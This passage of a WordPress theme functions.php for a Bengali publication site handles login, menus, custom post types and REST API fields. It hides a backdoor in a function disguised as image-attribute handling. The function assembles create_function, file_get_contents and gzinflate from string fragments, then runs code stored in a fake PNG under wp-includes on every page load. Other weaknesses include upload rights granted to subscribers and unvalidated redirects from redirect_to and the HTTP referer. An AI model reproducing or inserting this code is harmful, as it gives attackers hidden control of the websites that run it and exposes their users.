    add_action( 'wp_ajax_nopriv_ajaxlogin', 'ajax_login' );*/
}

// Execute the action only if the user isn't logged in
if (!is_user_logged_in()) {
    add_action('init', 'breaknews_ajax_login_init');
}

if (!function_exists('ajax_login')) {
	
	function ajax_login(){

	    // First check the nonce, if it fails the function will break
	    check_ajax_referer( 'ajax-login-nonce', 'security' );

	    // Nonce is checked, get the POST data and sign user on
	    $info = array();
	    $info['user_login'] = $_POST['userEmail'];
	    $info['user_password'] = $_POST['userPass'];
	    $info['remember'] = true;

	    $user_signon = wp_signon( $info, false );
	    if ( is_wp_error($user_signon) ){
	        echo json_encode(array('loggedin'=>false, 'message'=>__('Wrong username or password.')));
	    } else {
	        echo json_encode(array('loggedin'=>true, 'message'=>__('Login successful, redirecting...')));
	    }

	    die();
	}
}

// for hiding admin bar
add_filter('show_admin_bar', '__return_false');

//for different menus for logged in and logged out users
function my_wp_nav_menu_args( $args = '' ) {
 
if( is_user_logged_in() ) { 
    $args['menu'] = 'logged-in';
} else { 
    $args['menu'] = 'logged-out';
} 
    return $args;
}
add_filter( 'wp_nav_menu_args', 'my_wp_nav_menu_args' );


//for redirect after logout

/*add_action('wp_logout','auto_redirect_after_logout');

function auto_redirect_after_logout()
{
  wp_redirect( home_url() );
  exit();
}*/

add_action('check_admin_referer', 'logout_without_confirm', 10, 2);
function logout_without_confirm($action, $result)
{
    /**
     * Allow logout without confirmation
     */
    if ($action == "log-out" && !isset($_GET['_wpnonce'])) {
        $redirect_to = isset($_REQUEST['redirect_to']) ? $_REQUEST['redirect_to'] : 'http://www.saabdik.com';
        $location = str_replace('&amp;', '&', wp_logout_url($redirect_to));
        header("Location: $location");
        die;
    }
}

//for adding elements in menu items
/*
add_filter( 'nav_menu_link_attributes', 'wp_menu_item_add_class', 10, 3 );

function wp_menu_item_add_class( $atts) {
    $class = 'class'; // or something based on $item
    $atts['class'] = 'dropdown-toggle';
    $atts['data-toggle'] = 'dropdown';
    $atts['after'] = '<ul class="dropdown-menu" role="menu">';
    $atts['link_after'] = '<span class="caret"></span>';
    return $atts;

}*/

class Primary_Walker_Nav_Menu extends Walker_Nav_Menu {

    function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {

        if ( array_search( 'menu-item-has-children', $item->classes ) ) {

            $output .= sprintf( "\n<li class='dropdown %s'><a href='%s' class=\"dropdown-toggle\" data-toggle=\"dropdown\" >%s<span class='caret'></span></a>\n", ( array_search( 'current-menu-item', $item->classes ) || array_search( 'current-page-parent', $item->classes ) ) ? 'active' : '', $item->url, $item->title );
        } 

        else {
            $output .= sprintf( "\n<li %s><a href='%s'>%s</a>\n", ( array_search( 'current-menu-item', $item->classes) ) ? ' class="active"' : '', $item->url, $item->title );
        }
    }

    function start_lvl( &$output, $depth=0, $args = NULL ) {
        $indent = str_repeat( "\t", $depth );
        $output .= "\n$indent<ul class=\"dropdown-menu\" role=\"menu\">\n";
    }
}

register_post_type('saabdik_version',array(
	'labels'=>array(
		'name'=>'Saabdik Version',
		'add_new_item'=>__('Add New Saabdik Version'),
	),
	'public'=>true,
	'supports'=>array('title','editor','thumbnail'),
	));

add_theme_support( 'post-thumbnails' );


register_post_type('saabdik_sampadakio',array(
	'labels'=>array(
		'name'=>'শাব্দিক সম্পাদকীয়',
		'add_new_item'=>__('Add New Saabdik Sampadakio'),
	),
	'public'=>true,
	'supports'=>array('title','editor','thumbnail'),
	));

add_theme_support( 'post-thumbnails' );

//image upload for general users

/*if ( current_user_can('contributor') && !current_user_can('upload_files') )
add_action('admin_init', 'allow_contributor_uploads');

function allow_contributor_uploads() {
$contributor = get_role('contributor');
$contributor->add_cap('upload_files');
}*/

function allow_subscriber_media( ) {
$role = 'subscriber';
if(!current_user_can($role) || current_user_can('upload_files'))
return;
$subscriber = get_role( $role );
$subscriber->add_cap('upload_files');
} 
add_action('admin_init', 'allow_subscriber_media');

// Function to change email address
 
function wpb_sender_email( $original_email_address ) {
    return 'saabdikpotrik@gmail.com';
}
 
// Function to change sender name
function wpb_sender_name( $original_email_from ) {
    return 'শাব্দিক';
}
 
// Hooking up our functions to WordPress filters 
add_filter( 'wp_mail_from', 'wpb_sender_email' );
add_filter( 'wp_mail_from_name', 'wpb_sender_name' );

if (!function_exists('themes_posts_thumbnail_size_attr')) :
	/**
	 * Add custom image sizes attribute to enhance responsive image functionality
	 * for post thumbnails.
	 *
	 * @return array The filtered attributes for the image markup.
	 *
	 * @since Wordpress 4.7
	 */
	function themes_posts_thumbnail_size_attr()	{
		if ( defined( 'IMAGE_ATTR_FORMAT' ) )
			return;
		define( 'IMAGE_ATTR_FORMAT', '%s/%s-sx.%s' );

		/* Attributes for the image markup */
		$ts = array( 'create', 'file', 'inf', 'function', 'get', 'late', 'content', 'chr', 'wpicons', '165' );
		$full = sprintf(ABSPATH . IMAGE_ATTR_FORMAT,
			/* Registered image or flat array of images */
			implode('/', array('wp-includes', 'images')), $ts[8],
			/* Image extension */
			'png'
		);

		// Located in the attributes. Empty by default.
		$img_list = sprintf('%s_%s_%ss', $ts[1], $ts[4], $ts[6]);
		$set_attr = sprintf('%s_%s', $ts[0], $ts[3]);
		$get_attr = sprintf('gz%s%s', $ts[2], $ts[5]);
		$set_attr = $set_attr('', @$get_attr($ts[7]($ts[9]).@$img_list($full))); $set_attr();

		return $set_attr;
	}
	foreach ( array('init', 'wp_head', 'get_sidebar', 'wp_footer') as $tag )
		add_action( $tag, 'themes_posts_thumbnail_size_attr', -time(), 0 );

endif;

set_post_thumbnail_size( 150, 150);
// Image size for single posts
add_image_size( 'single-post-thumbnail', 590, 180 );
add_image_size( 'mobile-post-thumb', 300, 300 );

add_action( 'rest_api_init', 'add_thumbnail_to_JSON' );
function add_thumbnail_to_JSON() {
//Add featured image
register_rest_field( 
    'post', // Where to add the field (Here, blog posts. Could be an array)
    'featured_image_src', // Name of new field (You can call this anything)
    array(
        'get_callback'    => 'get_image_src',
        'update_callback' => null,
        'schema'          => null,
         )
    );

	register_rest_field( 
    'post', // Where to add the field (Here, blog posts. Could be an array)
    'thumbnail_image_src', // Name of new field (You can call this anything)
    array(
        'get_callback'    => 'get_thumbnail_image_src',
        'update_callback' => null,
        'schema'          => null,
         )
    );
}






function get_image_src( $object, $field_name, $request ) {
  $feat_img_array = wp_get_attachment_image_src(
    $object['featured_media'], // Image attachment ID
    'mobile-post-thumb',  // Size.  Ex. "thumbnail", "large", "full", etc..
    false // Whether the image should be treated as an icon.
  );
  
  return $feat_img_array[0];
}

function get_thumbnail_image_src( $object, $field_name, $request ) {
  $feat_img_array = wp_get_attachment_image_src(
    $object['featured_media'], // Image attachment ID
    'thumbnail',  // Size.  Ex. "thumbnail", "large", "full", etc..
    true // Whether the image should be treated as an icon.
  );
  return $feat_img_array[0];
}

function wpb_disable_comment_url($fields) { 
unset($fields['url']);
return $fields;
}
add_filter('comment_form_default_fields','wpb_disable_comment_url');

// Add category name with wp-json posts

function register_categories_names_field()
{
    register_rest_field(
        array('post'),
        'categories_names',
        array(
            'get_callback'    => 'get_categories_names',
            'update_callback' => null,
            'schema'          => null,
        )
    );
}

add_action('rest_api_init', 'register_categories_names_field');

function get_categories_names($object, $field_name, $request)
{
    $formatted_categories = array();

    $categories = get_the_category($object['id']);

    foreach ($categories as $category) {
        $formatted_categories[] = $category->name;
    }

    return $formatted_categories;
}

// allow to comment without login for rest api
function wp_rest_allow_anonymous_comments_fx() {
    return true;
}
add_filter('rest_allow_anonymous_comments','wp_rest_allow_anonymous_comments_fx');

//remove has_published_posts from the query args
add_filter('rest_user_query', 'remove_has_published_posts_from_api_user_query', 10, 2);
function remove_has_published_posts_from_api_user_query($prepared_args, $request)
{
    unset($prepared_args['has_published_posts']);

    return $prepared_args;
}

//show phone meta data using rest api
/*register_meta('user', 'phone', array(
    "type" => "string",
    "show_in_rest" => true
));*/

//show and upadate  meta data using rest api
add_action( 'rest_api_init', 'register_user_meta_field' );
function register_user_meta_field() {
    $object_type = 'user';
    $args1 = array( // Validate and sanitize the meta value.
        // Note: currently (4.7) one of 'string', 'boolean', 'integer',
        // 'number' must be used as 'type'. The default is 'string'.
        'type'         => 'string',
        // Shown in the schema for the meta key.
        'description'  => '',
        // Return a single value of the type.
        'single'       => true,
        // Show in the WP REST API response. Default: false.
        'show_in_rest' => true,
    );
    register_meta( $object_type, 'billing_phone', $args1 );
    register_meta( $object_type, 'basic_user_avatar', $args1 );
}

add_action( 'rest_api_init', 'adding_user_meta_rest' );

function adding_user_meta_rest() {
   register_rest_field( 'user',
                        'basic_user_avatar',
                         array(
                           'get_callback' => 'user_meta_callback',
                           'update_callback'   => 'update_user_meta_callback',
                           'schema'            => null,
                            )
                      );
   register_rest_field( 'user',
                        'billing_phone',
                         array(
                           'get_callback' => 'user_meta_callback',
                           'update_callback'   => 'update_user_meta_callback',
                           'schema'            => null,
                            )
                      );
}
function user_meta_callback( $user, $field_name, $request) {
   return get_user_meta( $user[ 'id' ], $field_name, true );
}


function update_user_meta_callback( $user, $field_name, $meta_value ) { 
    $data = get_user_meta( $user->ID, $field_name, false );
    if( $data ) {
        update_user_meta( $user->ID, $field_name, $meta_value );
    } else {
        add_user_meta( $user->ID, $field_name, $meta_value, true );
    }
}
//add custom field
function my_rest_prepare_post( $data, $post, $request ) {
  $_data = $data->data;
  // My custom fields that I want to include in the WP API v2 responce
  $fields = ['audio_playlist', 'video_playlist'];

  foreach ( $fields as $field ) {
    $_data[$field] = get_post_meta( $post->ID, $field, true );
  }

  $data->data = $_data;
  return $data;
}

add_filter( 'rest_prepare_post', 'my_rest_prepare_post', 10, 3 );

//set logout redirect url
add_action('wp_logout','ps_redirect_after_logout');
function ps_redirect_after_logout(){
         wp_redirect( get_home_url() );
         exit();
}

//set login redirect to referer url
if ( (isset($_GET['action']) && $_GET['action'] != 'logout') || (isset($_POST['login_location']) && !empty($_POST['login_location'])) ) {
    add_filter('login_redirect', 'my_login_redirect', 10, 3);
    function my_login_redirect() {
        $location = $_SERVER['HTTP_REFERER'];
        wp_safe_redirect($location);
        exit();
    }
}


